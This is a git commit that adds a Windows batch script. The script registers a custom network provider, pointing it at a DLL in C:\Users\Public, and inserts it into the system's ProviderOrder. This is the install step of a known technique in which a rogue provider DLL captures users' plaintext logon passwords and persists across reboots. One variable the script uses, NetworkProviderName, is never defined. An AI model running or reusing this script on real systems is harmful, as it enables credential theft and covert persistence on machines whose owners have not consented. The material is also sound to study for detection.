acbed2806280604b38579d306eb86ed4bd33b0b4
Kotasukami <75394694+Kotasukami@users.noreply.github.com>
2025-05-25 04:39:44 -0400

    add files

---
+++ ConfigureRegistrySettingsBatch.bat
@@ -0,0 +1,16 @@
+@echo off
+
+set nombreNetworkProvider=NPWashuleru
+
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%nombreNetworkProvider%" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%nombreNetworkProvider%\NetworkProvider" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%nombreNetworkProvider%\NetworkProvider" /v Class /t REG_DWORD /d 2 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%nombreNetworkProvider%\NetworkProvider" /v Name /t REG_SZ /d %NetworkProviderName% /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\%nombreNetworkProvider%\NetworkProvider" /v ProviderPath /t REG_EXPAND_SZ /d C:\Users\Public\test_NetProv.dll /f
+
+for /f "tokens=2*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" /v ProviderOrder') do set ProviderOrder=%%B
+set NewProviderOrder=%ProviderOrder%,%nombreNetworkProvider%
+
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" /v ProviderOrder /t REG_SZ /d %NewProviderOrder% /f
+
+
